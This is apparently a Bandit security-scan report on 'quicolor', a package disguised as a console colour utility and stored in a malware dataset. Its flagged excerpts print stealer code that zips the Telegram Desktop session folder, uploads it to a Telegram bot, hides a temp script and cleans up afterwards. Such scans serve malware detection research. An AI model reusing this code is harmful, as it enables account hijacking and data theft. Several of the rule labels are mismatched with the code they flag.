Run started:2025-05-25 16:30:18.706317

Test results:
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:30
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
29	    # registered from the main thread
30	    if threading.current_thread() is threading.main_thread():
31	        _install_signal_handlers()

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:30
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
29	    # registered from the main thread
30	    if threading.current_thread() is threading.main_thread():
31	        _install_signal_handlers()

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:121
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
120	                if not should_ignore:
121	                    zipf.write(file_path, arcname=rel_path_str)
122	

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:127
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
126	    try:
127	        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_API_KEY}/sendDocument"
128	        

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:133
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
132	            
133	            response = requests.post(url, files=files, data=data)
134	            response.json()

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:150
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
149	    try:
150	        username = os.environ.get('USERNAME')
151	        source_folder = os.path.join('C:', 'Users', username, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')

--------------------------------------------------
>> Issue: [B828:signal] signal.signal
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:190
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b828_signal.html
189	    # Save original handlers
190	    _original_sigint_handler = signal.getsignal(signal.SIGINT)
191	    _original_sigterm_handler = signal.getsignal(signal.SIGTERM)

--------------------------------------------------
>> Issue: [B828:signal] signal.signal
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:191
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b828_signal.html
190	    _original_sigint_handler = signal.getsignal(signal.SIGINT)
191	    _original_sigterm_handler = signal.getsignal(signal.SIGTERM)
192	    

--------------------------------------------------
>> Issue: [B828:signal] signal.signal
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:194
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b828_signal.html
193	    # Install our custom handlers
194	    signal.signal(signal.SIGINT, _custom_signal_handler)
195	    signal.signal(signal.SIGTERM, _custom_signal_handler)

--------------------------------------------------
>> Issue: [B324:blacklist] signal_signal
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:194
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b324-signal-signal
193	    # Install our custom handlers
194	    signal.signal(signal.SIGINT, _custom_signal_handler)
195	    signal.signal(signal.SIGTERM, _custom_signal_handler)

--------------------------------------------------
>> Issue: [B828:signal] signal.signal
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:195
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b828_signal.html
194	    signal.signal(signal.SIGINT, _custom_signal_handler)
195	    signal.signal(signal.SIGTERM, _custom_signal_handler)
196	

--------------------------------------------------
>> Issue: [B324:blacklist] signal_signal
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:195
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b324-signal-signal
194	    signal.signal(signal.SIGINT, _custom_signal_handler)
195	    signal.signal(signal.SIGTERM, _custom_signal_handler)
196	

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:272
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
271	        with os.fdopen(fd, 'w') as f:
272	            f.write(f'''
273	import time
274	import os
275	import signal
276	import sys
277	
278	# PID of the parent process that launched us
279	parent_pid = {os.getpid()}
280	
281	# Give the parent a delay to set up any resources
282	time.sleep(1)
283	
284	# Monitor the parent process
285	try:
286	    while True:
287	        try:
288	            # Check if parent is still running
289	            os.kill(parent_pid, 0)
290	            time.sleep(1)
291	        except OSError:
292	            # Parent has terminated, wait a bit to ensure uploads complete
293	            time.sleep(240)  # Give it 4 minutes
294	            break
295	except:
296	    pass
297	
298	# Clean up
299	try:
300	    os.unlink("{script_path}")
301	except:

--------------------------------------------------
>> Issue: [B832:write] tempfile_NamedTemporaryFile_write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:272
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b832_write.html
271	        with os.fdopen(fd, 'w') as f:
272	            f.write(f'''
273	import time
274	import os
275	import signal
276	import sys
277	
278	# PID of the parent process that launched us
279	parent_pid = {os.getpid()}
280	
281	# Give the parent a delay to set up any resources
282	time.sleep(1)
283	
284	# Monitor the parent process
285	try:
286	    while True:
287	        try:
288	            # Check if parent is still running
289	            os.kill(parent_pid, 0)
290	            time.sleep(1)
291	        except OSError:
292	            # Parent has terminated, wait a bit to ensure uploads complete
293	            time.sleep(240)  # Give it 4 minutes
294	            break
295	except:
296	    pass
297	
298	# Clean up
299	try:
300	    os.unlink("{script_path}")
301	except:

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:334
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
333	        # Start the backup thread
334	        _backup_thread = threading.Thread(target=backup_telegram)
335	        _backup_thread.daemon = False  # Non-daemon threads should prevent program exit

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:358
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
357	        # even if imported from another script
358	        if threading.current_thread() is threading.main_thread():
359	            # If we're in the main thread, register an atexit handler again

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:358
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
357	        # even if imported from another script
358	        if threading.current_thread() is threading.main_thread():
359	            # If we're in the main thread, register an atexit handler again

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:445
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
444	        # even if imported from another script
445	        if threading.current_thread() is threading.main_thread():
446	            # If we're in the main thread, register an atexit handler again

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:445
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
444	        # even if imported from another script
445	        if threading.current_thread() is threading.main_thread():
446	            # If we're in the main thread, register an atexit handler again

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:476
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
475	    try:
476	        username = os.environ.get('USERNAME')
477	        source_folder = os.path.join('C:', 'Users', username, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:485
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
484	        # even if the parent process is terminated
485	        script = f"""
486	import os
487	import zipfile
488	import requests
489	import fnmatch
490	from pathlib import Path
491	
492	def compress_telegram_data_folder(source_folder, zip_file_path):
493	    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
494	        ignore_patterns = [
495	            '**/media_cache/**',
496	            '**/cache/**',
497	            '**/webview/**',
498	            '**/wvbots/**',
499	            '**/EBWebView/**',
500	            '**/temp/**',
501	            'working'
502	        ]
503	        
504	        source_path = Path(source_folder)
505	        
506	        for file_path in source_path.glob('**/*'):
507	            if file_path.is_file():
508	                rel_path = file_path.relative_to(source_path)
509	                rel_path_str = str(rel_path).replace('\\\\', '/')
510	                
511	                should_ignore = False
512	                for pattern in ignore_patterns:
513	                    if fnmatch.fnmatch(rel_path_str, pattern) or any(
514	                        fnmatch.fnmatch(part, pattern.replace('**/', '').replace('/**', '')) 
515	                        for part in rel_path_str.split('/')
516	                    ):
517	                        should_ignore = True
518	                        break
519	                
520	                if not should_ignore:
521	                    zipf.write(file_path, arcname=rel_path_str)
522	
523	def upload_to_telegram(zip_file_path):
524	    url = f"https://api.telegram.org/bot{telegram_api_key}/sendDocument"
525	    
526	    with open(zip_file_path, 'rb') as document:
527	        files = {{'document': document}}
528	        data = {{'chat_id': chat_id}}
529	        
530	        response = requests.post(url, files=files, data=data)
531	        
532	    # Clean up zip file after upload
533	    try:
534	        if os.path.exists(zip_file_path):
535	            os.remove(zip_file_path)
536	    except:
537	        pass
538	
539	# Script execution starts here
540	username = os.environ.get('USERNAME')
541	source_folder = '{source_folder}'
542	zip_file_path = os.path.join('C:', 'Users', username, 'AppData', 'Roaming', f'{{username}}.zip')
543	telegram_api_key = '{TELEGRAM_BOT_API_KEY}'
544	chat_id = '{TELEGRAM_CHAT_ID}'
545	

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:551
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
550	        # Write the script to a temporary file
551	        temp_script_path = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), f'_qc_temp_{os.getpid()}.py')
552	        with open(temp_script_path, 'w') as f:

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:553
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
552	        with open(temp_script_path, 'w') as f:
553	            f.write(script)
554	        

--------------------------------------------------
>> Issue: [B832:write] tempfile_NamedTemporaryFile_write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:553
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b832_write.html
552	        with open(temp_script_path, 'w') as f:
553	            f.write(script)
554	        

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:585
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
584	            if os.name == 'nt':
585	                os.system(f'attrib +h "{temp_script_path}"')  # Hide the file
586	                

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:585
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
584	            if os.name == 'nt':
585	                os.system(f'attrib +h "{temp_script_path}"')  # Hide the file
586	                

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/quicolor/__init__.py:596
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
595	                    
596	            cleanup_thread = threading.Thread(target=delayed_cleanup)
597	            cleanup_thread.daemon = True

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/quicolor-10.0.4/quicolor-10.0.4/quicolor-10.0.4/setup.py:14
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
13	    keywords="color, format, console, utility",
14	    url="https://github.com/author/quicolor",
15	    classifiers=[

--------------------------------------------------

Code scanned:
	Total lines of code: 416
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 6.0
		High: 22.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 25.0
		High: 3.0
Files skipped (0):
